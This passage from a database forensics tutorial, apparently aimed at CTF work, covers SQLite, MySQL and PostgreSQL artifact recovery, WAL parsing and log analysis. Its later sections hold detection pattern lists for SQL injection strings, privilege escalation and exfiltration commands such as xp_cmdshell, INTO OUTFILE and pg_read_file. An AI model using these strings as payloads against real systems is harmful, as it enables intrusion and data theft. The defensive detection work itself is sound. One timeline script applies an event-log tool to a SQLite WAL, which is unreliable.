SELECT 
    moz_annos.content as download_path,
    moz_places.url as source_url,
    datetime(moz_annos.dateAdded/1000000, 'unixepoch') as download_time
FROM moz_annos
JOIN moz_places ON moz_annos.place_id = moz_places.id
WHERE moz_annos.anno_attribute_id = (
    SELECT id FROM moz_anno_attributes WHERE name = 'downloads/destinationFileURI'
);
```

### Windows 10 Timeline (ActivitiesCache.db)

**Activity history:**

```sql
SELECT 
    Activity.Id,
    Activity.AppId,
    Activity.AppActivityId,
    ActivityOperation.OperationType,
    Activity.ActivityType,
    datetime(Activity.StartTime, 'unixepoch') as start_time,
    datetime(Activity.EndTime, 'unixepoch') as end_time,
    datetime(Activity.LastModifiedTime, 'unixepoch') as last_modified,
    Activity.OriginalPayload,
    Activity.Payload
FROM Activity
LEFT JOIN ActivityOperation ON Activity.Id = ActivityOperation.ActivityId
ORDER BY Activity.StartTime DESC;
```

**Application usage:**

```sql
-- Extract JSON payload for detailed info
SELECT 
    AppId,
    json_extract(Payload, '$.displayText') as display_text,
    json_extract(Payload, '$.description') as description,
    json_extract(Payload, '$.contentUri') as content_uri,
    datetime(StartTime, 'unixepoch') as start_time
FROM Activity
WHERE Payload IS NOT NULL
ORDER BY StartTime DESC;
```

### Deleted Record Recovery

SQLite uses a copy-on-write approach that leaves remnants of deleted data in unallocated space.

**Freelist pages:**

```bash
# Extract freelist pages (contain deleted data)
sqlite3 database.db "PRAGMA freelist_count;"

# Manual extraction using offset calculation
# Page size from header
page_size=$(sqlite3 database.db "PRAGMA page_size;")

# First freelist page from header (offset 0x20)
first_freelist=$(xxd -s 0x20 -l 4 database.db | awk '{print "0x"$2$3$4$5}')

# Extract freelist page
dd if=database.db of=freelist_page.bin bs=$page_size skip=$((first_freelist-1)) count=1

# Examine for deleted records
strings freelist_page.bin
xxd freelist_page.bin | less
```

**Using strings to find deleted data:**

```bash
# Extract readable strings from entire database
strings -a database.db > database_strings.txt

# Search for specific patterns
grep -i "password\|email\|username" database_strings.txt

# Extract potential deleted records
strings -a database.db | grep -A 5 -B 5 "deleted_keyword"
```

**Carving with SQLite Deleted Records Parser:**

```bash
# [Unverified] Various third-party tools exist for SQLite carving
# Manual approach using Python

python3 << 'EOF'
import sqlite3

def dump_all_data(db_path):
    conn = sqlite3.connect(db_path)
    
    # Dump entire database including slack space
    for line in conn.iterdump():
        print(line)
    
    conn.close()

dump_all_data('database.db')
EOF
```

### Write-Ahead Log (WAL) Analysis

SQLite WAL mode writes changes to a separate log file before committing to the main database, preserving recent activity.

**WAL file structure:**

```
Header (32 bytes):
Offset 0x00 (4 bytes): Magic number (0x377f0682 or 0x377f0683)
Offset 0x04 (4 bytes): File format version
Offset 0x08 (4 bytes): Database page size
Offset 0x0C (4 bytes): Checkpoint sequence number
Offset 0x10 (4 bytes): Salt-1
Offset 0x14 (4 bytes): Salt-2
Offset 0x18 (4 bytes): Checksum-1
Offset 0x1C (4 bytes): Checksum-2

Frames (header + page data):
Frame header (24 bytes):
- Page number (4 bytes)
- Database size after commit (4 bytes)
- Salt-1 (4 bytes)
- Salt-2 (4 bytes)
- Checksum-1 (4 bytes)
- Checksum-2 (4 bytes)

Frame data (page_size bytes):
- Copy of modified database page
```

**Analyzing WAL files:**

```bash
# Check if database uses WAL mode
sqlite3 database.db "PRAGMA journal_mode;"
# Output: wal (or delete/truncate/persist for rollback journal)

# View WAL file info
xxd -l 32 database.db-wal

# Count frames in WAL
page_size=$(sqlite3 database.db "PRAGMA page_size;")
wal_size=$(stat -c%s database.db-wal)
frame_size=$((page_size + 24))
num_frames=$((($wal_size - 32) / $frame_size))
echo "Number of frames: $num_frames"
```

**Extracting WAL frames:**

```python
import struct

def parse_wal(wal_path, page_size):
    with open(wal_path, 'rb') as f:
        # Read header
        header = f.read(32)
        magic = struct.unpack('>I', header[0:4])[0]
        file_format = struct.unpack('>I', header[4:8])[0]
        db_page_size = struct.unpack('>I', header[8:12])[0]
        checkpoint_seq = struct.unpack('>I', header[12:16])[0]
        
        print(f"Magic: {hex(magic)}")
        print(f"Page size: {db_page_size}")
        print(f"Checkpoint sequence: {checkpoint_seq}")
        print()
        
        frame_num = 0
        while True:
            # Read frame header
            frame_header = f.read(24)
            if len(frame_header) < 24:
                break
            
            page_num = struct.unpack('>I', frame_header[0:4])[0]
            db_size = struct.unpack('>I', frame_header[4:8])[0]
            
            # Read frame data
            frame_data = f.read(page_size)
            if len(frame_data) < page_size:
                break
            
            frame_num += 1
            print(f"Frame {frame_num}: Page {page_num}, DB size {db_size}")
            
            # Save frame to file for analysis
            with open(f"frame_{frame_num}_page_{page_num}.bin", 'wb') as out:
                out.write(frame_data)

# Usage
page_size = 4096  # Get from PRAGMA page_size
parse_wal('database.db-wal', page_size)
```

**Recovering recent activity from WAL:**

```bash
# WAL contains uncommitted changes
# These may represent:
# - Recent user activity not yet flushed to main DB
# - Deleted records before VACUUM
# - Transaction rollbacks

# Extract strings from WAL
strings database.db-wal > wal_strings.txt

# Compare with main database
strings database.db > db_strings.txt
comm -23 <(sort wal_strings.txt) <(sort db_strings.txt) > wal_only.txt

# wal_only.txt contains data in WAL but not in main database
```

**Checkpoint operation:**

```sql
-- Force checkpoint (merge WAL into main database)
PRAGMA wal_checkpoint(FULL);

-- [Inference] Checkpoint causes WAL data to be written to main DB
-- For forensics, preserve WAL before checkpointing to retain all data
```

### Advanced SQLite Forensics Tools

**SQLite Browser (GUI):**

```bash
apt-get install sqlitebrowser

# Launch GUI
sqlitebrowser database.db

# Features:
# - Browse data and schema
# - Execute SQL queries
# - Export to CSV/SQL
# - Edit data (use with caution on evidence)
# - View unallocated space (Browse Data > [unallocated])
```

**Undark (SQLite deleted record recovery):**

```bash
git clone https://github.com/inflex/undark.git
cd undark
make

# Recover deleted records
./undark -i database.db --freespace --output recovered.txt

# Extract all strings including slack space
./undark -i database.db --dump > all_data.txt
```

**SQLite Forensic Explorer (commercial):**

```bash
# [Unverified] Commercial tool with advanced recovery features
# Capabilities:
# - Carve deleted records from freelist
# - Parse WAL and journal files
# - Reconstruct database history
# - Timeline analysis
```

**Python sqlite3 forensics:**

```python
import sqlite3

def forensic_dump(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Get all tables
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    
    for table_name in tables:
        table_name = table_name[0]
        print(f"\n{'='*50}")
        print(f"Table: {table_name}")
        print('='*50)
        
        # Get schema
        cursor.execute(f"PRAGMA table_info({table_name});")
        schema = cursor.fetchall()
        print("\nSchema:")
        for col in schema:
            print(f"  {col[1]} ({col[2]})")
        
        # Get row count
        cursor.execute(f"SELECT COUNT(*) FROM {table_name};")
        count = cursor.fetchone()[0]
        print(f"\nRow count: {count}")
        
        # Sample first 5 rows
        cursor.execute(f"SELECT * FROM {table_name} LIMIT 5;")
        rows = cursor.fetchall()
        print("\nSample data:")
        for row in rows:
            print(f"  {row}")
    
    conn.close()

forensic_dump('database.db')
```

## MySQL Forensics Basics

MySQL is a client-server relational database system commonly used in web applications, enterprise systems, and CTF challenges.

### MySQL File Structure

**Data directory locations:**

```
Linux (default):
/var/lib/mysql/
├── mysql/              - System database
├── <database_name>/    - User databases
│   ├── *.frm          - Table structure (MySQL 5.7 and earlier)
│   ├── *.ibd          - InnoDB table data (file-per-table)
│   ├── *.MYD          - MyISAM data
│   └── *.MYI          - MyISAM indexes
├── ibdata1            - InnoDB system tablespace
├── ib_logfile0/1      - InnoDB redo logs
├── mysql-bin.00000X   - Binary logs (replication/point-in-time recovery)
├── *.pid              - Process ID file
└── *.err              - Error log

Windows (default):
C:\ProgramData\MySQL\MySQL Server X.X\Data\
```

**Configuration files:**

```
Linux:
/etc/mysql/my.cnf
/etc/my.cnf
~/.my.cnf

Windows:
C:\ProgramData\MySQL\MySQL Server X.X\my.ini
```

### Identifying MySQL Files

**File signatures:**

```bash
# InnoDB tablespace
xxd -l 100 ibdata1 | head
# Look for "InnoDB" string or specific format markers

# MyISAM table format (.frm)
xxd -l 10 table.frm
# Starts with: FE 01 (MySQL 5.7 and earlier)

# Binary log
file mysql-bin.000001
# Output: MySQL replication log
```

**Extracting database names:**

```bash
# List directories in data directory
ls -la /var/lib/mysql/

# Each directory (except system dirs) represents a database
# System databases: mysql, information_schema, performance_schema, sys
```

### Recovering MySQL Data Files

**From running MySQL instance:**

```bash
# Connect to MySQL
mysql -u root -p

# List databases
SHOW DATABASES;

# Select database
USE database_name;

# List tables
SHOW TABLES;

# Dump database
mysqldump -u root -p database_name > database_dump.sql

# Dump specific table
mysqldump -u root -p database_name table_name > table_dump.sql

# Dump all databases
mysqldump -u root -p --all-databases > all_databases.sql

# Include routines and triggers
mysqldump -u root -p --all-databases --routines --triggers > complete_dump.sql
```

**From disk image (offline):**

```bash
# Mount image
mount -o ro,loop,offset=<offset> disk.raw /mnt/disk

# Copy MySQL data directory
cp -r /mnt/disk/var/lib/mysql ./mysql_data/

# Preserve permissions and timestamps
cp -rp /mnt/disk/var/lib/mysql ./mysql_data/
```

### Analyzing InnoDB Tables

**InnoDB file-per-table (.ibd files):**

```bash
# Check if file-per-table is enabled
# In my.cnf: innodb_file_per_table = 1

# Each table has its own .ibd file
# Format: database_name/table_name.ibd
```

**Extracting table structure (MySQL 5.7 and earlier):**

```bash
# .frm files contain table definition
# Can be parsed to recover schema

# Using mysqlfrm (MySQL Utilities)
mysqlfrm --diagnostic table.frm

# Output shows CREATE TABLE statement
```

**Parsing .ibd files:**

```bash
# InnoDB page structure (default 16KB pages)
# Page types:
# - Index pages: B-tree structures
# - Undo log pages: Transaction history
# - System pages: Metadata

# View raw page data
xxd -l 16384 table.ibd | less

# Page header (38 bytes):
# Offset 0: Checksum
# Offset 4: Page number
# Offset 8: Previous page
# Offset 12: Next page
# Offset 16: LSN (Log Sequence Number)
# Offset 24: Page type
# Offset 26: Flush LSN
# Offset 34: Space ID
```

**Recovering data with innodb_space:**

```bash
# Install innodb_space (Ruby gem)
gem install innodb_ruby

# Display tablespace information
innodb_space -f table.ibd space-summary

# List pages
innodb_space -f table.ibd space-page-type-regions

# Dump index information
innodb_space -f table.ibd space-indexes

# Dump records from index
innodb_space -f table.ibd index-recurse <index_id>

# Export records to CSV
innodb_space -f table.ibd index-recurse <index_id> | grep "record" > records.txt
```

### MyISAM Table Recovery

**MyISAM files:**

```
table.frm - Table structure
table.MYD - Table data (MyData)
table.MYI - Table indexes (MyIndex)
```

**Recovering MyISAM tables:**

```bash
# Check/repair MyISAM table
myisamchk table.MYI

# Repair corrupted table
myisamchk --recover table.MYI

# Display table information
myisamchk --description table.MYI

# Dump records (requires MySQL installation)
# Copy files to MySQL data directory
cp table.{frm,MYD,MYI} /var/lib/mysql/database_name/

# Restart MySQL or flush tables
mysql -u root -p -e "FLUSH TABLES;"

# Query data
mysql -u root -p database_name -e "SELECT * FROM table;"
```

### Database Log Examination

**Error log analysis:**

```bash
# Default location
tail -f /var/log/mysql/error.log

# Look for:
# - Authentication failures
# - Connection attempts
# - Crashes/restarts
# - Configuration changes
# - Backup operations

# Extract suspicious activity
grep -i "access denied\|failed\|error" /var/log/mysql/error.log

# Connection attempts
grep "connect" /var/log/mysql/error.log | awk '{print $1, $2, $3, $NF}'
```

**General query log (if enabled):**

```bash
# Enable in my.cnf:
# general_log = 1
# general_log_file = /var/log/mysql/general.log

# Shows all SQL queries executed
tail -f /var/log/mysql/general.log

# Extract specific queries
grep -i "SELECT.*FROM users" /var/log/mysql/general.log

# Identify data exfiltration
grep -i "SELECT.*INTO OUTFILE" /var/log/mysql/general.log
```

**Slow query log:**

```bash
# Enable in my.cnf:
# slow_query_log = 1
# slow_query_log_file = /var/log/mysql/slow-query.log
# long_query_time = 2

# Parse slow query log
mysqldumpslow /var/log/mysql/slow-query.log

# Show top 10 slowest queries
mysqldumpslow -t 10 /var/log/mysql/slow-query.log
```

### Binary Log Analysis

Binary logs record all database-modifying statements for replication and point-in-time recovery.

**Enabling binary logging:**

```
# In my.cnf:
log_bin = /var/log/mysql/mysql-bin.log
server-id = 1
binlog_format = ROW  # or STATEMENT or MIXED
```

**Viewing binary logs:**

```bash
# List binary logs
mysql -u root -p -e "SHOW BINARY LOGS;"

# Show current binary log position
mysql -u root -p -e "SHOW MASTER STATUS;"

# Display binary log contents
mysqlbinlog mysql-bin.000001

# Output to file
mysqlbinlog mysql-bin.000001 > binlog_001.sql

# View specific time range
mysqlbinlog --start-datetime="2024-01-01 00:00:00" \
            --stop-datetime="2024-01-02 00:00:00" \
            mysql-bin.000001 > binlog_filtered.sql

# View specific position range
mysqlbinlog --start-position=1000 --stop-position=5000 mysql-bin.000001
```

**Analyzing binary log events:**

```bash
# Common event types:
# - Query_event: DDL/DML statements
# - Table_map_event: Table metadata
# - Write_rows_event: INSERT operations
# - Update_rows_event: UPDATE operations
# - Delete_rows_event: DELETE operations

# Extract specific operations
mysqlbinlog mysql-bin.000001 | grep -A 10 "DELETE FROM users"

# Find all INSERT statements
mysqlbinlog mysql-bin.000001 | grep -i "INSERT"

# Timeline of database changes
mysqlbinlog mysql-bin.000001 | grep "^#" | awk '{print $1, $2, $3}'
```

**Recovering deleted data from binlog:**

```bash
# Binary logs contain full record data for ROW format
# Can reconstruct deleted records

# Find DELETE operations
mysqlbinlog --base64-output=DECODE-ROWS -v mysql-bin.000001 | grep -A 20 "DELETE FROM"

# Output shows actual column values deleted
# Example output:
# DELETE FROM `users`
# WHERE
#   @1=123 /* User ID */
#   @2='john@example.com' /* Email */
#   @3='John Doe' /* Name */
```

**Converting binlog to SQL:**

```bash
# STATEMENT format: Already SQL
mysqlbinlog mysql-bin.000001 > statements.sql

# ROW format: Decode to pseudo-SQL
mysqlbinlog --base64-output=DECODE-ROWS -v mysql-bin.000001 > decoded.sql

# Replay binary log
mysql -u root -p < statements.sql
```

### Forensic Queries

**User authentication history (if enabled):**

```sql
-- Connection history (requires audit plugin or general log)
-- From general log:
SELECT event_time, user_host, argument
FROM mysql.general_log
WHERE command_type = 'Connect'
ORDER BY event_time DESC;
```

**Privilege escalation detection:**

```sql
-- Check user privileges
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv,
       Create_priv, Drop_priv, Grant_priv, Super_priv, File_priv
FROM mysql.user;

-- Identify users with FILE privilege (can read/write files)
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';

-- Users with SUPER privilege
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';

-- Recently modified user accounts
SELECT user, host, password_last_changed
FROM mysql.user
ORDER BY password_last_changed DESC;
```

**Database schema analysis:**

```sql
-- List all databases
SHOW DATABASES;

-- List tables in database
USE database_name;
SHOW TABLES;

-- Get table structure
DESCRIBE table_name;
SHOW CREATE TABLE table_name;

-- Find tables by name pattern
SELECT TABLE_SCHEMA, TABLE_NAME
FROM information_schema.TABLES
WHERE TABLE_NAME LIKE '%user%';

-- List all columns containing specific name
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE
FROM information_schema.COLUMNS
WHERE COLUMN_NAME LIKE '%password%';
```

**Suspicious activity detection:**

```sql
-- Large data exports (INTO OUTFILE)
-- Check binlog or general log

-- Database structure changes
SELECT EVENT_TIME, USER_HOST, COMMAND_TYPE, ARGUMENT
FROM mysql.general_log
WHERE ARGUMENT REGEXP 'CREATE|ALTER|DROP|TRUNCATE'
ORDER BY EVENT_TIME DESC;

-- Failed login attempts (if logged)
-- Check error log for "Access denied" messages
```

### MySQL Deleted Record Recovery

**[Inference] MySQL deleted records are not immediately overwritten:**

```bash
# InnoDB: Records marked as deleted but may remain in pages until OPTIMIZE TABLE
# MyISAM: Deleted records leave gaps that may contain residual data
# Recovery depends on storage engine and subsequent operations
```

**InnoDB deleted record recovery:**

```bash
# Use innodb_ruby to scan pages for deleted records
innodb_space -f table.ibd space-page-type-summary

# Dump all records including deleted (marked with delete flag)
innodb_space -f table.ibd -r index-recurse <index_id> > all_records.txt

# Look for records with delete markers
grep -i "deleted" all_records.txt

# [Inference] Deleted records remain until purge thread removes them
# Purge delay provides recovery window
```

**Carving MySQL data from disk:**

```bash
# Search for table data patterns in unallocated space
strings -a disk.raw | grep -A 5 -B 5 "known_table_value"

# Extract InnoDB pages from disk image
# Page size: 16KB (default)
dd if=disk.raw of=carved_pages.bin bs=16384 skip=0

# Use bulk_extractor for automated carving
bulk_extractor -o mysql_carved disk.raw

# Check for database-specific patterns
# Email addresses, usernames, etc.
```

**Using Undrop for InnoDB:**

```bash
# [Unverified] Third-party tool for InnoDB recovery
# Undrop-for-innodb (TwinDB)

git clone https://github.com/twindb/undrop-for-innodb.git
cd undrop-for-innodb
make

# Extract table definitions
./stream_parser -f table.ibd

# Recover deleted records
./c_parser -f pages-ibdata1/FIL_PAGE_INDEX/*.page -t table.sql > recovered_data.txt
```

## PostgreSQL Artifact Analysis

PostgreSQL is an advanced open-source relational database with robust features commonly found in enterprise environments and CTF challenges.

### PostgreSQL File Structure

**Data directory (PGDATA):**

```
/var/lib/postgresql/<version>/main/
├── base/                    - Database files
│   └── <oid>/              - Database directory (OID = object ID)
│       ├── <relfilenode>   - Table/index data files
│       └── <relfilenode>.1 - Continuation files (>1GB)
├── global/                  - Cluster-wide tables
│   ├── pg_database         - Database catalog
│   ├── pg_control          - Control information
│   └── pg_filenode.map     - OID to filename mapping
├── pg_wal/                  - Write-Ahead Log files (pg_xlog in v9.6 and earlier)
│   └── 000000010000000000000001  - WAL segments (16MB each)
├── pg_xact/                 - Transaction commit status (pg_clog in v9.6 and earlier)
├── pg_stat/                 - Statistics files
├── pg_stat_tmp/             - Temporary statistics
├── postgresql.conf          - Main configuration
├── pg_hba.conf             - Host-based authentication
├── pg_ident.conf           - User name mapping
└── postmaster.pid          - PID file (if running)
```

**Configuration files:**

```
postgresql.conf    - Server configuration
pg_hba.conf        - Client authentication rules
pg_ident.conf      - Username mappings
```

### Identifying PostgreSQL Files

**File signatures:**

```bash
# PostgreSQL data page
xxd -l 8192 <relfilenode> | head
# Pages are typically 8KB (default)

# Check pg_control
pg_controldata /var/lib/postgresql/<version>/main/

# Output includes:
# - Database cluster state
# - Latest checkpoint location
# - System identifier
# - Database block size
# - WAL block size
```

**Mapping OIDs to database names:**

```bash
# From running PostgreSQL
psql -U postgres -c "SELECT oid, datname FROM pg_database;"

# From disk (offline)
# pg_database is in global/
# OID 1262 = pg_database system catalog

# Use pg_filedump to examine
pg_filedump /var/lib/postgresql/<version>/main/global/1262

# Or use strings
strings /var/lib/postgresql/<version>/main/global/1262
```

### Recovering PostgreSQL Data

**From running instance:**

```bash
# Connect to PostgreSQL
psql -U postgres

# List databases
\l

# Connect to database
\c database_name

# List tables
\dt

# Describe table
\d table_name

# Dump database
pg_dump -U postgres database_name > database_dump.sql

# Dump specific table
pg_dump -U postgres -t table_name database_name > table_dump.sql

# Dump all databases
pg_dumpall -U postgres > all_databases.sql

# Include BLOB data
pg_dump -U postgres --format=custom --blobs database_name > database.dump
```

**From disk image (offline):**

```bash
# Copy PGDATA directory
cp -rp /mnt/disk/var/lib/postgresql/<version>/main ./pgdata/

# Start PostgreSQL with copied data
# Ensure correct permissions
chown -R postgres:postgres ./pgdata/

# Start server pointing to copied data
sudo -u postgres /usr/lib/postgresql/<version>/bin/postgres -D ./pgdata/

# Or use pg_basebackup format
```

### PostgreSQL Page Structure

**Page layout (8KB default):**

```
Page Header (24 bytes):
Offset 0x00 (8 bytes):  Page LSN (Log Sequence Number)
Offset 0x08 (2 bytes):  Checksum
Offset 0x0A (2 bytes):  Flags
Offset 0x0C (2 bytes):  Lower pointer (end of item pointers)
Offset 0x0E (2 bytes):  Upper pointer (start of free space)
Offset 0x10 (2 bytes):  Special space pointer
Offset 0x12 (2 bytes):  Page size version
Offset 0x14 (4 bytes):  Prune XID
Offset 0x18 (variable): Item pointer array

Item Pointers (4 bytes each):
- Offset (2 bytes): Location of tuple in page
- Length (2 bytes): Length of tuple

Free Space

Tuples (variable length):
- Heap tuple header
- Data

Special Space (optional, for indexes)
```

**Using pg_filedump:**

```bash
# Install pg_filedump
apt-get install postgresql-<version>-pg-filedump

# Dump page contents
pg_filedump -f /var/lib/postgresql/<version>/main/base/<dboid>/<relfilenode>

# Interpret items
pg_filedump -i /var/lib/postgresql/<version>/main/base/<dboid>/<relfilenode>

# Dump specific page range
pg_filedump -R 0 100 /path/to/relfilenode

# Output shows:
# - Page headers
# - Item pointers
# - Tuple data
# - Transaction IDs
```

**Manual page parsing:**

```python
import struct

def parse_pg_page(filepath, page_num=0, page_size=8192):
    with open(filepath, 'rb') as f:
        f.seek(page_num * page_size)
        page_data = f.read(page_size)
    
    # Parse page header
    lsn = struct.unpack('<Q', page_data[0:8])[0]
    checksum = struct.unpack('<H', page_data[8:10])[0]
    flags = struct.unpack('<H', page_data[10:12])[0]
    lower = struct.unpack('<H', page_data[12:14])[0]
    upper = struct.unpack('<H', page_data[14:16])[0]
    special = struct.unpack('<H', page_data[16:18])[0]
    
    print(f"Page {page_num}:")
    print(f"  LSN: {lsn}")
    print(f"  Lower: {lower}, Upper: {upper}")
    print(f"  Free space: {upper - lower} bytes")
    
    # Parse item pointers
    num_items = (lower - 24) // 4
    print(f"  Number of items: {num_items}")
    
    for i in range(num_items):
        offset_pos = 24 + (i * 4)
        item_offset = struct.unpack('<H', page_data[offset_pos:offset_pos+2])[0]
        item_length = struct.unpack('<H', page_data[offset_pos+2:offset_pos+4])[0]
        
        print(f"  Item {i}: offset={item_offset}, length={item_length}")
        
        # Extract tuple data
        if item_offset > 0 and item_length > 0:
            tuple_data = page_data[item_offset:item_offset+item_length]
            # Parse tuple header and data as needed

parse_pg_page('16384', page_num=0)
```

### PostgreSQL System Catalogs

**Key system tables:**

```sql
-- Database information
SELECT oid, datname, datdba, encoding, datcollate
FROM pg_database;

-- Table information
SELECT schemaname, tablename, tableowner
FROM pg_tables
WHERE schemaname NOT IN ('pg_catalog', 'information_schema');

-- Column information
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public';

-- User accounts
SELECT usename, usesysid, usecreatedb, usesuper, passwd
FROM pg_shadow;

-- Or (without password hash)
SELECT usename, usesysid, usecreatedb, usesuper
FROM pg_user;

-- User privileges
SELECT grantee, table_schema, table_name, privilege_type
FROM information_schema.role_table_grants
WHERE grantee != 'postgres';

-- Active connections (if database running)
SELECT pid, usename, application_name, client_addr, backend_start, query
FROM pg_stat_activity;
```

### Write-Ahead Log (WAL) Analysis

PostgreSQL WAL records all changes before applying them to data files.

**WAL file structure:**

```
WAL files in pg_wal/ directory
- Default 16MB segments
- Named: 000000010000000000000001, 000000010000000000000002, etc.
- Format: TimelineID + LogFileSequence

WAL Record Structure:
- Record header
- Resource manager ID
- Transaction ID
- Record data (varies by operation)
```

**Reading WAL files:**

```bash
# Use pg_waldump (pg_xlogdump in v9.6 and earlier)
pg_waldump /var/lib/postgresql/<version>/main/pg_wal/000000010000000000000001

# Filter by transaction ID
pg_waldump -x <xid> /path/to/pg_wal/000000010000000000000001

# Filter by resource manager (rmgr)
pg_waldump -r Heap /path/to/pg_wal/000000010000000000000001

# Show timeline
pg_waldump -t 1 /path/to/pg_wal/000000010000000000000001

# Output includes:
# - LSN (Log Sequence Number)
# - Transaction ID
# - Resource Manager
# - Record type (INSERT, UPDATE, DELETE, COMMIT, etc.)
# - Details of operation
```

**Common resource managers:**

```
Heap     - Table data operations
Btree    - B-tree index operations
Hash     - Hash index operations
Gin      - GIN index operations
Gist     - GiST index operations
Transaction - Transaction state changes
Database - Database operations
```

**Extracting specific operations:**

```bash
# Find all INSERT operations
pg_waldump /path/to/pg_wal/* | grep "INSERT"

# Find all DELETE operations
pg_waldump /path/to/pg_wal/* | grep "DELETE"

# Extract data modifications in time range
pg_waldump -s <start_lsn> -e <end_lsn> /path/to/pg_wal/*

# Timeline of database activity
pg_waldump /path/to/pg_wal/* | awk '{print $1, $2, $6}' | sort
```

**Recovering deleted data from WAL:**

```bash
# WAL contains full tuple data for DELETE operations
pg_waldump /path/to/pg_wal/* | grep -A 10 "DELETE"

# Output example:
# rmgr: Heap        len (rec/tot):     54/    54, tx:       1234, lsn: 0/01234567, prev 0/01234560, desc: DELETE off 3, blkref #0: rel 1663/16384/16385 blk 0
# Shows deleted tuple location and transaction ID
```

### PostgreSQL Log Analysis

**Server log locations:**

```
# Default log directory
/var/log/postgresql/postgresql-<version>-main.log

# Or configured in postgresql.conf:
# log_directory = 'pg_log'
# log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
```

**Log configuration options:**

```
# In postgresql.conf
logging_collector = on
log_directory = 'pg_log'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
log_connections = on           # Log connection attempts
log_disconnections = on        # Log disconnections
log_duration = on              # Log statement duration
log_statement = 'all'          # Log all SQL statements (none/ddl/mod/all)
log_line_prefix = '%t [%p]: [%l-1] user=%u,db=%d,app=%a,client=%h '
```

**Parsing PostgreSQL logs:**

```bash
# Connection attempts
grep "connection authorized" /var/log/postgresql/postgresql-*.log

# Failed authentication
grep "authentication failed" /var/log/postgresql/postgresql-*.log

# Executed queries
grep "statement:" /var/log/postgresql/postgresql-*.log

# Long-running queries
grep "duration:" /var/log/postgresql/postgresql-*.log | awk '{if ($6 > 1000) print}'

# Database errors
grep "ERROR:" /var/log/postgresql/postgresql-*.log

# Extract user activity timeline
awk -F',' '/statement:/ {print $1, $2, $6}' /var/log/postgresql/postgresql-*.log | sort
```

**Detecting suspicious activity:**

```bash
# SQL injection attempts
grep -i "UNION SELECT\|'; DROP\|' OR '1'='1" /var/log/postgresql/postgresql-*.log

# Privilege escalation
grep -i "ALTER USER\|GRANT\|CREATE ROLE" /var/log/postgresql/postgresql-*.log

# Data exfiltration
grep -i "COPY.*TO\|pg_read_file" /var/log/postgresql/postgresql-*.log

# Mass data access
grep "SELECT.*FROM.*WHERE" /var/log/postgresql/postgresql-*.log | wc -l
```

### PostgreSQL Deleted Record Recovery

**MVCC (Multi-Version Concurrency Control):**

```sql
-- PostgreSQL uses MVCC: old row versions remain until VACUUM
-- Deleted rows marked as dead but not immediately removed

-- Check for dead tuples
SELECT schemaname, tablename, n_dead_tup
FROM pg_stat_user_tables
ORDER BY n_dead_tup DESC;

-- Prevent autovacuum temporarily (for forensics)
ALTER TABLE table_name SET (autovacuum_enabled = false);
```

**Accessing system columns:**

```sql
-- System columns provide tuple metadata
SELECT ctid,           -- Physical location (page, tuple)
       xmin,           -- Transaction ID that created row
       xmax,           -- Transaction ID that deleted row (0 if not deleted)
       cmin,           -- Command ID within transaction
       cmax,           -- Command ID that deleted row
       *
FROM table_name;

-- Find deleted rows (xmax != 0)
-- [Inference] Requires special configuration or extensions
-- Standard queries don't show deleted tuples
```

**Using pg_dirtyread extension:**

```bash
# [Unverified] Third-party extension to read deleted tuples
# Requires compilation and installation

git clone https://github.com/ChristophBerg/pg_dirtyread.git
cd pg_dirtyread
make
sudo make install

# In PostgreSQL
CREATE EXTENSION pg_dirtyread;

# Read all tuples including deleted
SELECT * FROM pg_dirtyread('table_name'::regclass);
```

**Manual page-level recovery:**

```bash
# Use pg_filedump to extract all tuples
pg_filedump -i -f /path/to/relfilenode > tuples.txt

# Look for tuples with deleted markers
grep -B 5 -A 10 "XMAX" tuples.txt

# Reconstruct data from tuple dumps
# Requires understanding of table structure
```

## Database Log Examination

Comprehensive log analysis across database systems for forensic investigation.

### Log Types Across Systems

**Transaction logs:**

```
SQLite:   WAL file (.db-wal)
MySQL:    Binary logs (mysql-bin.*)
PostgreSQL: WAL files (pg_wal/*)

Purpose:
- Record all data-modifying operations
- Enable recovery and replication
- Forensic timeline reconstruction
```

**Query logs:**

```
MySQL:     General query log
PostgreSQL: Server log with log_statement='all'

Purpose:
- Record all executed SQL
- User activity tracking
- Attack detection
```

**Error logs:**

```
MySQL:     Error log (.err)
PostgreSQL: Server log (ERROR entries)

Purpose:
- Authentication failures
- System errors
- Configuration issues
```

### Cross-Database Log Correlation

**Building unified timeline:**

```bash
#!/bin/bash
# Combine logs from multiple sources

echo "Timestamp,Source,Event,Details" > unified_timeline.csv

# SQLite WAL
evtx_dump.py database.db-wal | awk -F'|' '{print $1",SQLite,"$2","$3}' >> unified_timeline.csv

# MySQL binary log
mysqlbinlog mysql-bin.000001 | awk '/^#[0-9]/ {gsub(/^#/, ""); print $1" "$2",MySQL,"$0}' >> unified_timeline.csv

# PostgreSQL WAL
pg_waldump pg_wal/* | awk '{print $1",PostgreSQL,"$6","$0}' >> unified_timeline.csv

# PostgreSQL server log
awk -F',' '{print $1",PostgreSQL,"$5","$0}' postgresql.log >> unified_timeline.csv

# Sort by timestamp
sort -t',' -k1 unified_timeline.csv -o unified_timeline_sorted.csv
```

### Attack Pattern Detection

**SQL injection indicators:**

```bash
# Check all database logs for injection patterns
patterns=(
    "UNION SELECT"
    "'; DROP"
    "' OR '1'='1"
    "' OR 1=1--"
    "admin'--"
    "' WAITFOR DELAY"
    "xp_cmdshell"
    "LOAD_FILE"
    "INTO OUTFILE"
)

for pattern in "${patterns[@]}"; do
    echo "Checking for: $pattern"
    grep -i "$pattern" *log* 2>/dev/null
done
```

**Privilege escalation:**

```bash
# Detect privilege changes across databases
grep -i "GRANT\|ALTER USER\|CREATE USER.*SUPERUSER\|CREATE ROLE" *log*

# User creation/modification
grep -i "CREATE USER\|DROP USER\|ALTER USER.*PASSWORD" *log*
```

**Data exfiltration:**

```bash
# Large SELECT operations
grep "SELECT" *log* | awk '{if (length($0) > 500) print}'

# Export operations
grep -i "INTO OUTFILE\|COPY.*TO\|pg_read_file\|mysqldump" *log*

# High-volume queries
grep "SELECT.*FROM" *log* | awk '{print $1}' | uniq -c | sort -rn | head -20
```

